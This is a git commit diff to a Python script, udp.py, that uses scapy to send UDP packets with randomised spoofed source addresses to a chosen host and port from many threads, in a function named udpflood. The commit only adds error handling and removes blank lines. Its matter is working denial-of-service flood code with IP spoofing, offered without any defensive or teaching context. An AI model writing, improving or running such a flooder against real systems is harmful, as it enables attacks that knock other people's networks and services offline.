005ee492ff187bc4a0449cb7de22b2348b7a55f7
Mormito <guimormis@gmail.com>
2025-09-01 09:51:15 -0300

    fixing errors

--- udp.py
+++ udp.py
@@ -2,8 +2,8 @@ from scapy.all import IP, UDP, RandIP, send
 import threading
 from concurrent.futures import ThreadPoolExecutor
 
-
 def send_udp_packet(destiny, destiny_port):
+    try:
         source = RandIP()
 
         ip_packet = IP(src=source, dst=destiny)
@@ -11,24 +11,12 @@ def send_udp_packet(destiny, destiny_port):
 
         complete_packet = ip_packet / udp_packet
         send(complete_packet, verbose=False)
-    
-    
+    except Exception as e:
+        print(f"Erro ao enviar pacote: {e}")
+
 def udpflood(destiny, destiny_port, num_of_packets, num_of_workers):
     with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
         for _ in range(num_of_packets):
             executor.submit(send_udp_packet, destiny, destiny_port)
 
     print(f"Total de pacotes enviados: {num_of_packets}")
-
-
-
-
-
-
-
-
-
-
-
-
-
